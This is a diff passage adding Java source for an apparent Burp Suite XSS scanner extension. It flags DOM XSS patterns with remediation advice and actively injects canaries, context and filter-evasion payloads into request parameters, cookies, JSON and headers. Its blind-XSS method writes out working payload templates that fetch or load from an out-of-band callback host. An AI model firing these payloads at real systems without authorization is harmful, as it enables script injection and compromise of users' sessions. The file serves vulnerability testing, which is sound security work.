+                    Matcher varM = Pattern.compile("(\\w+)\\s*=\\s*" + Pattern.quote(dataAccess)).matcher(handlerBody);
+                    if (varM.find()) {
+                        String varName = varM.group(1);
+                        if (handlerBody.contains(sink) && handlerBody.contains(varName)) {
+                            dataUsedInSink = true;
+                            sinkFound = sink + " (via variable '" + varName + "')";
+                            break;
+                        }
+                    }
+                }
+            }
+
+            if (dataUsedInSink) {
+                String key = "postmessage|" + handlerStart;
+                if (reported.contains(key)) continue;
+
+                Severity sev = hasOriginCheck ? Severity.MEDIUM : Severity.HIGH;
+                String context = extractContext(script, handlerStart,
+                        Math.min(script.length(), handlerStart + handlerBody.length() + 100));
+
+                findings.add(Finding.builder("xss-scanner",
+                                "DOM XSS via postMessage Handler"
+                                        + (hasOriginCheck ? " (origin check present)" : " (NO origin check!)"),
+                                sev, Confidence.TENTATIVE)
+                        .url(url)
+                        .evidence("Handler: addEventListener('message', ...)"
+                                + "\nData access: " + dataAccess
+                                + "\nSink: " + sinkFound
+                                + "\nOrigin check: " + (hasOriginCheck ? "YES" : "NO")
+                                + "\nContext:\n" + context)
+                        .description("A postMessage event handler receives external data via " + dataAccess
+                                + " and passes it to " + sinkFound + "."
+                                + (hasOriginCheck ? " An origin check is present, but verify it's correct."
+                                : " No origin validation — any page can send messages to this handler."))
+                        .remediation("Always validate event.origin against expected domains before processing "
+                                + "postMessage data. Sanitize event.data before using in DOM sinks.")
+                        .requestResponse(reqResp)
+                        .build());
+                reported.add(key);
+            }
+        }
+    }
+
+    /**
+     * Phase 5: eval() and eval-like functions called with DOM sources.
+     */
+    private void analyzeEvalPatterns(String script, String url, HttpRequestResponse reqResp,
+                                      List<Finding> findings, Set<String> reported) {
+        // Pattern: eval(location.hash.substring(1))
+        for (String execSink : DOM_SINKS_EXEC) {
+            int idx = -1;
+            while ((idx = script.indexOf(execSink, idx + 1)) >= 0) {
+                // Extract the argument (content between parentheses)
+                int parenStart = idx + execSink.length();
+                if (parenStart >= script.length()) break;
+                String arg = extractParenContent(script, idx);
+                if (arg.isEmpty()) continue;
+
+                for (String source : DOM_SOURCES_ALL) {
+                    if (arg.contains(source)) {
+                        String key = "eval|" + execSink + "|" + source;
+                        if (reported.contains(key)) continue;
+
+                        String context = extractContext(script, idx, idx + execSink.length() + arg.length());
+
+                        findings.add(Finding.builder("xss-scanner",
+                                        "DOM XSS: " + execSink.trim() + " with User Input",
+                                        Severity.CRITICAL, Confidence.FIRM)
+                                .url(url)
+                                .evidence("Sink: " + execSink.trim() + "\nSource in argument: " + source
+                                        + "\nArgument: " + truncate(arg, 200)
+                                        + "\nContext:\n" + context)
+                                .description("Code execution sink '" + execSink.trim()
+                                        + "' is called with user-controllable input from '" + source
+                                        + "'. An attacker can execute arbitrary JavaScript.")
+                                .remediation("Never pass user input to eval(), Function(), setTimeout(string), "
+                                        + "or setInterval(string). Use safer alternatives.")
+                                .requestResponse(reqResp)
+                                .build());
+                        reported.add(key);
+                        break;
+                    }
+                }
+            }
+        }
+    }
+
+    /**
+     * Phase 6: Dynamic script/iframe loading from user input.
+     * Detects createElement('script').src = userInput patterns.
+     */
+    private void analyzeDynamicLoading(String script, String url, HttpRequestResponse reqResp,
+                                        List<Finding> findings, Set<String> reported) {
+        // Pattern: createElement('script') ... .src = location.hash
+        Pattern createScript = Pattern.compile(
+                "createElement\\s*\\(\\s*['\"](?:script|iframe|embed|object)['\"]\\s*\\)",
+                Pattern.CASE_INSENSITIVE);
+        Matcher csm = createScript.matcher(script);
+        while (csm.find()) {
+            // Check the surrounding 500 chars for .src = <source>
+            int regionEnd = Math.min(script.length(), csm.end() + 500);
+            String region = script.substring(csm.start(), regionEnd);
+
+            for (String source : DOM_SOURCES_ALL) {
+                if (region.contains(source) && (region.contains(".src") || region.contains(".href"))) {
+                    String key = "dynamic-load|" + csm.start() + "|" + source;
+                    if (reported.contains(key)) continue;
+
+                    String context = extractContext(script, csm.start(), regionEnd);
+
+                    findings.add(Finding.builder("xss-scanner",
+                                    "DOM XSS: Dynamic Script/Iframe Loading from User Input",
+                                    Severity.CRITICAL, Confidence.FIRM)
+                            .url(url)
+                            .evidence("Pattern: createElement + src/href assignment from " + source
+                                    + "\nContext:\n" + context)
+                            .description("A script/iframe element is dynamically created and its src is set "
+                                    + "from user-controlled input '" + source + "'. An attacker can load "
+                                    + "arbitrary JavaScript from an external domain.")
+                            .remediation("Never set script.src or iframe.src from user input. Validate URLs "
+                                    + "against a whitelist of allowed domains.")
+                            .requestResponse(reqResp)
+                            .build());
+                    reported.add(key);
+                    break;
+                }
+            }
+        }
+    }
+
+    /**
+     * Phase 7: HTML event handler attributes containing DOM sources.
+     * Detects: <div onclick="eval(location.hash)">
+     */
+    private void analyzeHtmlEventHandlers(String body, String url, HttpRequestResponse reqResp,
+                                           List<Finding> findings, Set<String> reported) {
+        Matcher ehm = EVENT_HANDLER_ATTR.matcher(body);
+        while (ehm.find()) {
+            String handlerCode = ehm.group(1);
+
+            for (String source : DOM_SOURCES_ALL) {
+                if (handlerCode.contains(source)) {
+                    String key = "event-handler|" + ehm.group() + "|" + source;
+                    if (reported.contains(key)) continue;
+
+                    // Check if source flows to a dangerous operation
+                    boolean dangerous = false;
+                    for (String sink : DOM_SINKS_EXEC) {
+                        if (handlerCode.contains(sink.replace("(", ""))) {
+                            dangerous = true;
+                            break;
+                        }
+                    }
+                    for (String sink : DOM_SINKS_HTML) {
+                        if (handlerCode.contains(sink.replace("(", "").replace(".", ""))) {
+                            dangerous = true;
+                            break;
+                        }
+                    }
+
+                    // The source being in an event handler is dangerous on its own
+                    findings.add(Finding.builder("xss-scanner",
+                                    "DOM XSS: Event Handler with User Input",
+                                    dangerous ? Severity.HIGH : Severity.MEDIUM, Confidence.TENTATIVE)
+                            .url(url)
+                            .evidence("Event handler: " + truncate(ehm.group(), 150)
+                                    + "\nSource: " + source
+                                    + "\nDangerous operation: " + (dangerous ? "YES" : "No direct sink found"))
+                            .description("An HTML event handler attribute contains user-controllable input "
+                                    + "from '" + source + "'." + (dangerous ? " A dangerous operation "
+                                    + "was detected in the handler code." : ""))
+                            .requestResponse(reqResp)
+                            .build());
+                    reported.add(key);
+                    break;
+                }
+            }
+        }
+    }
+
+    /**
+     * Phase 8: javascript: URL schemes containing DOM sources.
+     * Detects: <a href="javascript:eval(location.hash)">
+     */
+    private void analyzeJavaScriptUrls(String body, String url, HttpRequestResponse reqResp,
+                                        List<Finding> findings, Set<String> reported) {
+        Matcher jsm = JS_URL_SCHEME.matcher(body);
+        while (jsm.find()) {
+            String jsCode = jsm.group(1);
+
+            for (String source : DOM_SOURCES_ALL) {
+                if (jsCode.contains(source)) {
+                    String key = "js-url|" + jsm.start() + "|" + source;
+                    if (reported.contains(key)) continue;
+
+                    findings.add(Finding.builder("xss-scanner",
+                                    "DOM XSS: javascript: URL with User Input",
+                                    Severity.HIGH, Confidence.FIRM)
+                            .url(url)
+                            .evidence("javascript: URL: " + truncate(jsm.group(), 200)
+                                    + "\nSource: " + source)
+                            .description("A javascript: URL scheme contains user-controllable input from '"
+                                    + source + "'. This allows arbitrary code execution when the link is clicked "
+                                    + "or element is loaded.")
+                            .remediation("Never use javascript: URLs with user input. Use event handlers "
+                                    + "and validate all input.")
+                            .requestResponse(reqResp)
+                            .build());
+                    reported.add(key);
+                    break;
+                }
+            }
+        }
+    }
+
+    /**
+     * Phase 9: Framework-specific DOM XSS patterns in HTML attributes.
+     */
+    private void analyzeFrameworkAttributes(String body, String url, HttpRequestResponse reqResp,
+                                             List<Finding> findings, Set<String> reported) {
+        // Vue: v-html with dynamic binding
+        Pattern vueVHtml = Pattern.compile("v-html\\s*=\\s*[\"']([^\"']+)[\"']");
+        Matcher vuem = vueVHtml.matcher(body);
+        while (vuem.find()) {
+            String key = "vue-vhtml|" + vuem.start();
+            if (reported.contains(key)) continue;
+
+            findings.add(Finding.builder("xss-scanner",
+                            "DOM XSS: Vue v-html Directive",
+                            Severity.MEDIUM, Confidence.TENTATIVE)
+                    .url(url)
+                    .evidence("v-html binding: " + vuem.group()
+                            + "\nExpression: " + vuem.group(1))
+                    .description("Vue's v-html directive renders raw HTML without sanitization. If the bound "
+                            + "expression '" + vuem.group(1) + "' contains user-controlled data, XSS is possible.")
+                    .remediation("Use {{ }} interpolation (auto-escaped) instead of v-html. If HTML rendering "
+                            + "is needed, sanitize with DOMPurify first.")
+                    .requestResponse(reqResp)
+                    .build());
+            reported.add(key);
+        }
+
+        // React: dangerouslySetInnerHTML with dynamic content
+        Pattern reactDanger = Pattern.compile(
+                "dangerouslySetInnerHTML\\s*=\\s*\\{\\{\\s*__html\\s*:\\s*([^}]{1,300})\\}\\}");
+        Matcher reactm = reactDanger.matcher(body);
+        while (reactm.find()) {
+            String key = "react-danger|" + reactm.start();
+            if (reported.contains(key)) continue;
+
+            findings.add(Finding.builder("xss-scanner",
+                            "DOM XSS: React dangerouslySetInnerHTML",
+                            Severity.MEDIUM, Confidence.TENTATIVE)
+                    .url(url)
+                    .evidence("React: " + truncate(reactm.group(), 200)
+                            + "\nContent expression: " + reactm.group(1).trim())
+                    .description("React's dangerouslySetInnerHTML renders unescaped HTML. If the content "
+                            + "includes user-controlled data, XSS is possible.")
+                    .remediation("Avoid dangerouslySetInnerHTML. If needed, sanitize with DOMPurify.sanitize() "
+                            + "before passing to __html.")
+                    .requestResponse(reqResp)
+                    .build());
+            reported.add(key);
+        }
+
+        // Angular: bypassSecurityTrust* calls
+        Pattern angularBypass = Pattern.compile(
+                "bypassSecurityTrust(Html|Script|Url|ResourceUrl|Style)\\s*\\(",
+                Pattern.CASE_INSENSITIVE);
+        Matcher angm = angularBypass.matcher(body);
+        while (angm.find()) {
+            String key = "angular-bypass|" + angm.start();
+            if (reported.contains(key)) continue;
+
+            findings.add(Finding.builder("xss-scanner",
+                            "DOM XSS: Angular Security Bypass — bypassSecurityTrust" + angm.group(1),
+                            Severity.HIGH, Confidence.TENTATIVE)
+                    .url(url)
+                    .evidence("Angular bypass: " + angm.group())
+                    .description("Angular's DomSanitizer.bypassSecurityTrust" + angm.group(1)
+                            + "() disables Angular's built-in XSS protection. If the input contains "
+                            + "user-controlled data, XSS is possible.")
+                    .remediation("Avoid bypassSecurityTrust* functions. Use Angular's built-in sanitization "
+                            + "or sanitize with DOMPurify before bypassing.")
+                    .requestResponse(reqResp)
+                    .build());
+            reported.add(key);
+        }
+
+        // AngularJS: ng-bind-html without $sce
+        if (body.contains("ng-bind-html")) {
+            Pattern ngBind = Pattern.compile("ng-bind-html\\s*=\\s*[\"']([^\"']+)[\"']");
+            Matcher ngm = ngBind.matcher(body);
+            while (ngm.find()) {
+                String key = "angularjs-bind|" + ngm.start();
+                if (reported.contains(key)) continue;
+
+                findings.add(Finding.builder("xss-scanner",
+                                "DOM XSS: AngularJS ng-bind-html",
+                                Severity.MEDIUM, Confidence.TENTATIVE)
+                        .url(url)
+                        .evidence("ng-bind-html: " + ngm.group()
+                                + "\nExpression: " + ngm.group(1))
+                        .description("AngularJS ng-bind-html renders HTML content. If the bound expression "
+                                + "contains user input, XSS may be possible (especially in AngularJS < 1.6 "
+                                + "or with $sce disabled).")
+                        .requestResponse(reqResp)
+                        .build());
+                reported.add(key);
+            }
+        }
+    }
+
+    // ==================== ACTIVE: DOM XSS TESTING ====================
+
+    /**
+     * Active DOM XSS testing: injects canary into URL parameters and checks
+     * if it appears inside script blocks near dangerous sinks.
+     */
+    private void testActiveDomXss(HttpRequestResponse original, XssTarget target) throws InterruptedException {
+        String url = original.request().url();
+
+        // Inject DOM canary into the parameter
+        HttpRequestResponse canaryResult = sendPayload(original, target, DOM_CANARY);
+        if (canaryResult == null || canaryResult.response() == null) return;
+
+        String responseBody = canaryResult.response().bodyToString();
+        if (!responseBody.contains(DOM_CANARY)) return;
+
+        // Check if canary appears inside a <script> block
+        List<String> scriptBlocks = extractScriptBlocks(responseBody, "text/html");
+        for (String script : scriptBlocks) {
+            if (!script.contains(DOM_CANARY)) continue;
+
+            // Canary is reflected inside JavaScript — check context
+            api.logging().logToOutput("[XSS] DOM canary reflected in script block for param '"
+                    + target.name + "'");
+
+            // Check if canary is near any sink
+            for (String sink : DOM_SINKS_ALL) {
+                int canaryIdx = script.indexOf(DOM_CANARY);
+                int sinkIdx = script.indexOf(sink);
+                if (canaryIdx >= 0 && sinkIdx >= 0 && Math.abs(canaryIdx - sinkIdx) < 500) {
+                    // Check if canary is in a variable assignment
+                    String beforeCanary = script.substring(Math.max(0, canaryIdx - 100), canaryIdx);
+                    boolean inAssignment = beforeCanary.matches("(?s).*(?:var|let|const)\\s+\\w+\\s*=\\s*[\"']?$")
+                            || beforeCanary.matches("(?s).*=\\s*[\"']?$");
+
+                    boolean sanitized = isSanitized(
+                            script.substring(Math.max(0, Math.min(canaryIdx, sinkIdx) - 50),
+                                    Math.min(script.length(), Math.max(canaryIdx, sinkIdx) + 50)));
+
+                    Severity sev = sanitized ? Severity.MEDIUM : Severity.HIGH;
+                    String context = extractContext(script, Math.min(canaryIdx, sinkIdx),
+                            Math.max(canaryIdx + DOM_CANARY.length(), sinkIdx + sink.length()));
+
+                    findingsStore.addFinding(Finding.builder("xss-scanner",
+                                    "DOM XSS: Reflected Parameter in Script Block Near Sink"
+                                            + (sanitized ? " (sanitizer detected)" : ""),
+                                    sev, sanitized ? Confidence.TENTATIVE : Confidence.FIRM)
+                            .url(url)
+                            .parameter(target.name)
+                            .evidence("Param '" + target.name + "' reflected in <script> block near sink '" + sink + "'"
+                                    + "\nIn assignment: " + inAssignment
+                                    + (sanitized ? "\nSanitizer detected" : "")
+                                    + "\nContext:\n" + context)
+                            .description("URL parameter '" + target.name + "' is reflected inside a JavaScript "
+                                    + "block and appears near the dangerous sink '" + sink + "'. "
+                                    + (inAssignment ? "The value is assigned to a variable that may flow to the sink. "
+                                    : "")
+                                    + "An attacker can potentially control JavaScript execution via this parameter.")
+                            .remediation("Encode user input before embedding in JavaScript contexts. "
+                                    + "Use JSON.stringify() for values inside JS strings.")
+                            .requestResponse(canaryResult)
+                            .build());
+                    return; // One finding per parameter
+                }
+            }
+
+            // Even without a nearby sink, reflection in JS is noteworthy
+            findingsStore.addFinding(Finding.builder("xss-scanner",
+                            "Parameter Reflected in JavaScript Block",
+                            Severity.MEDIUM, Confidence.TENTATIVE)
+                    .url(url)
+                    .parameter(target.name)
+                    .evidence("Param '" + target.name + "' canary found inside <script> block")
+                    .description("URL parameter '" + target.name + "' value is reflected inside a "
+                            + "JavaScript block. While no direct sink was found nearby, this may enable "
+                            + "DOM XSS if the value flows to a sink elsewhere in the code.")
+                    .requestResponse(canaryResult)
+                    .build());
+        }
+    }
+
+    // ==================== DOM XSS HELPER METHODS ====================
+
+    /** Checks if any known sanitizer is present in the given code region. */
+    private boolean isSanitized(String region) {
+        for (String san : SANITIZERS) {
+            if (region.contains(san)) return true;
+        }
+        return false;
+    }
+
+    /** Returns severity based on sink type. */
+    private Severity getSinkSeverity(String sink) {
+        for (String s : DOM_SINKS_EXEC) if (sink.equals(s)) return Severity.CRITICAL;
+        for (String s : DOM_SINKS_HTML) if (sink.equals(s)) return Severity.HIGH;
+        for (String s : DOM_SINKS_URL) if (sink.equals(s)) return Severity.HIGH;
+        for (String s : DOM_SINKS_JQUERY) if (sink.equals(s)) return Severity.MEDIUM;
+        return Severity.MEDIUM;
+    }
+
+    /** Returns confidence based on source risk level. */
+    private Confidence getSourceConfidence(String source) {
+        for (String s : DOM_SOURCES_HIGH) if (source.equals(s)) return Confidence.FIRM;
+        return Confidence.TENTATIVE;
+    }
+
+    /** Extracts surrounding context for evidence display. */
+    private String extractContext(String script, int start, int end) {
+        int ctxStart = Math.max(0, start - 80);
+        int ctxEnd = Math.min(script.length(), end + 80);
+        String ctx = script.substring(ctxStart, ctxEnd).trim();
+        if (ctx.length() > 400) ctx = ctx.substring(0, 400);
+        return (ctxStart > 0 ? "..." : "") + ctx + (ctxEnd < script.length() ? "..." : "");
+    }
+
+    /** Extracts content inside parentheses starting from the given position. */
+    private String extractParenContent(String script, int startIdx) {
+        int openParen = script.indexOf('(', startIdx);
+        if (openParen < 0 || openParen > startIdx + 50) return "";
+
+        int depth = 1;
+        int i = openParen + 1;
+        while (i < script.length() && depth > 0) {
+            char c = script.charAt(i);
+            if (c == '(') depth++;
+            else if (c == ')') depth--;
+            i++;
+        }
+        if (depth != 0) return "";
+        return script.substring(openParen + 1, i - 1);
+    }
+
+    /** Extracts a function body starting from an opening brace. */
+    private String extractFunctionBody(String script, int braceStart) {
+        if (braceStart >= script.length()) return "";
+        int depth = 1;
+        int i = braceStart + 1;
+        int maxLen = Math.min(script.length(), braceStart + 2000);
+        while (i < maxLen && depth > 0) {
+            char c = script.charAt(i);
+            if (c == '{') depth++;
+            else if (c == '}') depth--;
+            i++;
+        }
+        if (depth != 0) return script.substring(braceStart, Math.min(script.length(), braceStart + 1000));
+        return script.substring(braceStart, i);
+    }
+
+    /** Checks if two strings appear within the same code block (between matching braces). */
+    private boolean areSameBlock(String script, String a, String b) {
+        int aIdx = script.indexOf(a);
+        int bIdx = script.indexOf(b);
+        if (aIdx < 0 || bIdx < 0) return false;
+        return Math.abs(aIdx - bIdx) < 500;
+    }
+
+    // ==================== ACTIVE: REFLECTED XSS ====================
+
+    private void testReflectedXss(HttpRequestResponse original, XssTarget target) throws InterruptedException {
+        String url = original.request().url();
+
+        // Step 1: Inject canary to find reflection
+        api.logging().logToOutput("[XSS] Step 1: Testing param '" + target.name + "' with canary on " + url);
+
+        HttpRequestResponse canaryResult = sendPayload(original, target, CANARY);
+        if (canaryResult == null) {
+            api.logging().logToError("[XSS] Canary request returned NULL for param '" + target.name + "' — sendPayload failed");
+            return;
+        }
+        if (canaryResult.response() == null) {
+            api.logging().logToError("[XSS] Canary response is NULL for param '" + target.name + "'");
+            return;
+        }
+
+        String canaryBody = canaryResult.response().bodyToString();
+        if (!canaryBody.contains(CANARY)) {
+            api.logging().logToOutput("[XSS] Canary NOT reflected for param '" + target.name + "' — skipping");
+            return;
+        }
+
+        // Step 2: Identify reflection context
+        String context = identifyContext(canaryBody, CANARY);
+        api.logging().logToOutput("[XSS] Reflection found for param '" + target.name + "' in context: " + context);
+
+        findingsStore.addFinding(Finding.builder("xss-scanner",
+                        "XSS: Input reflected in " + context + " context",
+                        Severity.INFO, Confidence.CERTAIN)
+                .url(url).parameter(target.name)
+                .evidence("Canary '" + CANARY + "' reflected in " + context + " context")
+                .description("User input is reflected in the response. Testing context-specific payloads.")
+                .requestResponse(canaryResult)
+                .build());
+
+        // Step 3: Send context-specific payloads
+        String[][] payloads = CONTEXT_PAYLOADS.get(context);
+        if (payloads == null) payloads = CONTEXT_PAYLOADS.get("HTML_BODY"); // Default
+
+        for (String[] payload : payloads) {
+            String xssPayload = payload[0];
+            String checkFor = payload[1];
+            String desc = payload[2];
+
+    
+            HttpRequestResponse result = sendPayload(original, target, xssPayload);
+            if (result == null || result.response() == null) continue;
+
+            String body = result.response().bodyToString();
+
+            // Check if the payload or its key marker survived in the response
+            if (!checkFor.isEmpty() && body.contains(checkFor)) {
+                findingsStore.addFinding(Finding.builder("xss-scanner",
+                                "XSS Confirmed: " + desc + " in " + context,
+                                Severity.HIGH, Confidence.FIRM)
+                        .url(url).parameter(target.name)
+                        .evidence("Payload: " + xssPayload + " | Marker '" + checkFor + "' found in response")
+                        .description("Reflected XSS via " + desc + ". Context: " + context + ".")
+                        .requestResponse(result)
+                        .build());
+                return; // XSS confirmed, stop testing this param
+            }
+            perHostDelay();
+        }
+
+        // Step 4: Try filter evasion payloads if basic payloads failed
+        if (config.getBool("xss.evasion.enabled", true)) {
+            testFilterEvasion(original, target, url, context);
+        }
+
+        // Step 5: Blind XSS via Collaborator
+        if (config.getBool("xss.blindOob.enabled", true)
+                && collaboratorManager != null && collaboratorManager.isAvailable()) {
+            testBlindXss(original, target, url);
+        }
+    }
+
+    private void testFilterEvasion(HttpRequestResponse original, XssTarget target,
+                                    String url, String context) throws InterruptedException {
+        for (String[] evasion : EVASION_PAYLOADS) {
+            String payload = evasion[0];
+            String checkFor = evasion[1];
+            String technique = evasion[2];
+
+    
+            HttpRequestResponse result = sendPayload(original, target, payload);
+            if (result == null || result.response() == null) continue;
+
+            String body = result.response().bodyToString();
+
+            if (!checkFor.isEmpty() && body.contains(checkFor)) {
+                findingsStore.addFinding(Finding.builder("xss-scanner",
+                                "XSS via Filter Evasion: " + technique,
+                                Severity.HIGH, Confidence.FIRM)
+                        .url(url).parameter(target.name)
+                        .evidence("Evasion technique: " + technique + " | Payload: " + payload)
+                        .description("XSS filter bypassed using " + technique + ". Context: " + context + ".")
+                        .requestResponse(result)
+                        .build());
+                return;
+            }
+            perHostDelay();
+        }
+    }
+
+    // ==================== BLIND XSS VIA COLLABORATOR ====================
+
+    private void testBlindXss(HttpRequestResponse original, XssTarget target, String url) throws InterruptedException {
+        // Each blind payload gets its own Collaborator callback for precise attribution
+        String[][] blindPayloadTemplates = {
+                {"\"><script src=https://COLLAB></script>", "script src"},
+                {"'\"><img src=x onerror=fetch('https://COLLAB')>", "img onerror fetch"},
+                {"\"><img src=https://COLLAB>", "img src direct"},
+                {"\"><input onfocus=fetch('https://COLLAB') autofocus>", "input onfocus autofocus"},
+                {"\"><svg onload=fetch('https://COLLAB')>", "SVG onload fetch"},
+                {"\"><body onload=fetch('https://COLLAB')>", "body onload fetch"},
+                {"javascript:fetch('https://COLLAB')//", "javascript: scheme fetch"},
+                {"\"><link rel=stylesheet href=https://COLLAB>", "link stylesheet import"},
+                {"\"><object data=https://COLLAB>", "object data tag"},
+        };
+
+        for (String[] entry : blindPayloadTemplates) {
+            String template = entry[0];
+            String technique = entry[1];
+
+            AtomicReference<HttpRequestResponse> sentRequest = new AtomicReference<>();
+            String collabDomain = collaboratorManager.generatePayload(
+                    "xss-scanner", url, target.name, "Blind XSS OOB (" + technique + ")",
+                    interaction -> {
+                        findingsStore.addFinding(Finding.builder("xss-scanner",
+                                        "Blind XSS via Out-of-Band Interaction (" + technique + ")",
+                                        Severity.CRITICAL, Confidence.CERTAIN)
+                                .url(url).parameter(target.name)
+                                .evidence("Collaborator " + interaction.type().name()
+                                        + " interaction from " + interaction.clientIp()
+                                        + " at " + interaction.timeStamp()
+                                        + " | Technique: " + technique)
+                                .description("Blind XSS confirmed via Burp Collaborator using " + technique + " technique. "
+                                        + "The injected payload was rendered in a different context (e.g., admin panel, "
+                                        + "log viewer, email) and triggered an out-of-band " + interaction.type().name()
+                                        + " callback. Parameter '" + target.name + "' is vulnerable.")
+                                .requestResponse(sentRequest.get())
+                                .build());
+                        api.logging().logToOutput("[XSS Blind] Confirmed OOB interaction! "
+                                + url + " param=" + target.name + " technique=" + technique);
+                    }
+            );
+
+            if (collabDomain == null) continue;
+
+            String payload = template.replace("COLLAB", collabDomain);
+            HttpRequestResponse result = sendPayload(original, target, payload);
+            sentRequest.set(result);
+            perHostDelay();
+        }
+    }
+
+    // ==================== CONTEXT IDENTIFICATION ====================
+
+    private String identifyContext(String body, String canary) {
+        int idx = body.indexOf(canary);
+        if (idx < 0) return "HTML_BODY";
+
+        // Get surrounding context (500 chars before and after)
+        String before = body.substring(Math.max(0, idx - 500), idx);
+        String after = body.substring(idx, Math.min(body.length(), idx + canary.length() + 500));
+
+        // Check if inside HTML comment
+        if (before.lastIndexOf("<!--") > before.lastIndexOf("-->")) {
+            return "HTML_COMMENT";
+        }
+
+        // Check if inside <script> tag
+        int lastScriptOpen = before.toLowerCase().lastIndexOf("<script");
+        int lastScriptClose = before.toLowerCase().lastIndexOf("</script");
+        if (lastScriptOpen > lastScriptClose) {
+            // Inside a script block - check if in a string
+            // Count unescaped quotes before the canary within the script
+            String scriptContent = before.substring(lastScriptOpen);
+            if (isInJsString(scriptContent, '\'') || isInJsString(scriptContent, '"')) {
+                return "JS_STRING";
+            }
+            if (scriptContent.contains("`") && countOccurrences(scriptContent, '`') % 2 == 1) {
+                return "JS_TEMPLATE_LITERAL";
+            }
+            return "JS_STRING"; // Default to JS string if in script
+        }
+
+        // Check if inside <style> tag
+        int lastStyleOpen = before.toLowerCase().lastIndexOf("<style");
+        int lastStyleClose = before.toLowerCase().lastIndexOf("</style");
+        if (lastStyleOpen > lastStyleClose) {
+            return "CSS_CONTEXT";
+        }
+
+        // Check if inside an HTML attribute
+        int lastAngleBracket = before.lastIndexOf('<');
+        int lastCloseAngle = before.lastIndexOf('>');
+        if (lastAngleBracket > lastCloseAngle) {
+            // Inside a tag — check if inside attribute value
+            String tagContent = before.substring(lastAngleBracket);
+            if (tagContent.contains("=\"") || tagContent.contains("='")) {
+                return "HTML_ATTRIBUTE";
+            }
+        }
+
+        return "HTML_BODY";
+    }
+
+    private boolean isInJsString(String content, char quoteChar) {
+        int count = 0;
+        for (int i = 0; i < content.length(); i++) {
+            if (content.charAt(i) == quoteChar) {
+                if (i == 0 || content.charAt(i - 1) != '\\') {
+                    count++;
+                }
+            }
+        }
+        return count % 2 == 1; // Odd count means we're inside a string
+    }
+
+    private int countOccurrences(String s, char c) {
+        int count = 0;
+        for (int i = 0; i < s.length(); i++) {
+            if (s.charAt(i) == c) count++;
+        }
+        return count;
+    }
+
+    // ==================== HELPERS ====================
+
+    private HttpRequestResponse sendPayload(HttpRequestResponse original, XssTarget target, String payload) {
+        try {
+            HttpRequest modified;
+            switch (target.type) {
+                case QUERY:
+                    modified = original.request().withUpdatedParameters(
+                            HttpParameter.urlParameter(target.name,
+                                    URLEncoder.encode(payload, StandardCharsets.UTF_8)));
+                    break;
+                case BODY:
+                    modified = original.request().withUpdatedParameters(
+                            HttpParameter.bodyParameter(target.name,
+                                    URLEncoder.encode(payload, StandardCharsets.UTF_8)));
+                    break;
+                case COOKIE:
+                    modified = original.request().withUpdatedParameters(
+                            HttpParameter.cookieParameter(target.name, payload));
+                    break;
+                case JSON:
+                    modified = injectJsonPayload(original.request(), target.name, payload);
+                    break;
+                case HEADER:
+                    modified = original.request().withRemovedHeader(target.name)
+                            .withAddedHeader(target.name, payload);
+                    break;
+                default:
+                    return null;
+            }
+            api.logging().logToOutput("[XSS] Sending payload to param '" + target.name + "': "
+                    + payload.substring(0, Math.min(80, payload.length()))
+                    + " → " + modified.url());
+            HttpRequestResponse result = api.http().sendRequest(modified);
+            if (result == null || result.response() == null) return null;
+            api.logging().logToOutput("[XSS] Response: HTTP " + result.response().statusCode()
+                    + " (" + result.response().bodyToString().length() + " chars)");
+            return result;
+        } catch (Exception e) {
+            api.logging().logToError("[XSS] sendPayload FAILED for param '" + target.name
+                    + "' payload='" + payload.substring(0, Math.min(50, payload.length()))
+                    + "': " + e.getClass().getName() + ": " + e.getMessage());
+            return null;
+        }
+    }
+
+    /**
+     * Inject a payload into a JSON body, supporting dot-notation keys for nested objects.
+     */
+    private HttpRequest injectJsonPayload(HttpRequest request, String dotKey, String payload) {
+        try {
+            String body = request.bodyToString();
+            com.google.gson.JsonElement root = com.google.gson.JsonParser.parseString(body);
+            if (!root.isJsonObject()) return request;
+
+            String escaped = payload.replace("\\", "\\\\").replace("\"", "\\\"");
+            String[] parts = dotKey.split("\\.");
+
+            if (parts.length == 1) {
+                // Top-level key — simple regex replacement
+                String pattern = "\"" + java.util.regex.Pattern.quote(dotKey) + "\"\\s*:\\s*(?:\"[^\"]*\"|\\d+(?:\\.\\d+)?|true|false|null)";
+                String replacement = "\"" + dotKey + "\": \"" + escaped + "\"";
+                return request.withBody(body.replaceFirst(pattern, replacement));
+            }
+
+            // Nested key — navigate to parent object and replace the leaf value
+            com.google.gson.JsonObject current = root.getAsJsonObject();
+            for (int i = 0; i < parts.length - 1; i++) {
+                com.google.gson.JsonElement child = current.get(parts[i]);
+                if (child == null || !child.isJsonObject()) return request;
+                current = child.getAsJsonObject();
+            }
+            String leafKey = parts[parts.length - 1];
+            current.addProperty(leafKey, payload);
+            return request.withBody(new com.google.gson.Gson().toJson(root));
+        } catch (Exception e) {
+            // Fallback: simple regex replacement for flat key
+            String body = request.bodyToString();
+            String escaped = payload.replace("\\", "\\\\").replace("\"", "\\\"");
+            String pattern = "\"" + java.util.regex.Pattern.quote(dotKey) + "\"\\s*:\\s*(?:\"[^\"]*\"|\\d+(?:\\.\\d+)?|true|false|null)";
+            String replacement = "\"" + dotKey + "\": \"" + escaped + "\"";
+            return request.withBody(body.replaceFirst(pattern, replacement));
+        }
+    }
+
+    private List<XssTarget> extractTargets(HttpRequest request) {
+        List<XssTarget> targets = new ArrayList<>();
+        for (var param : request.parameters()) {
+            switch (param.type()) {
+                case URL:
+                    targets.add(new XssTarget(param.name(), param.value(), XssTargetType.QUERY));
+                    break;
+                case BODY:
+                    targets.add(new XssTarget(param.name(), param.value(), XssTargetType.BODY));
+                    break;
+                case COOKIE:
+                    targets.add(new XssTarget(param.name(), param.value(), XssTargetType.COOKIE));
+                    break;
+            }
+        }
+
+        // JSON body parameters — recursive traversal with dot-notation keys
+        String contentType = "";
+        for (var h : request.headers()) {
+            if (h.name().equalsIgnoreCase("Content-Type")) {
+                contentType = h.value();
+                break;
+            }
+        }
+        if (contentType.contains("application/json")) {
+            try {
+                String body = request.bodyToString();
+                if (body != null && !body.isBlank()) {
+                    com.google.gson.JsonElement el = com.google.gson.JsonParser.parseString(body);
+                    if (el.isJsonObject()) {
+                        extractJsonXssTargets(el.getAsJsonObject(), "", targets);
+                    }
+                }
+            } catch (Exception ignored) {}
+        }
+
+        // XSS-relevant headers — commonly reflected in responses
+        String[] xssHeaders = {"User-Agent", "Referer", "X-Forwarded-For", "Origin"};
+        for (String headerName : xssHeaders) {
+            String headerValue = "";
+            for (var h : request.headers()) {
+                if (h.name().equalsIgnoreCase(headerName)) {
+                    headerValue = h.value();
+                    break;
+                }
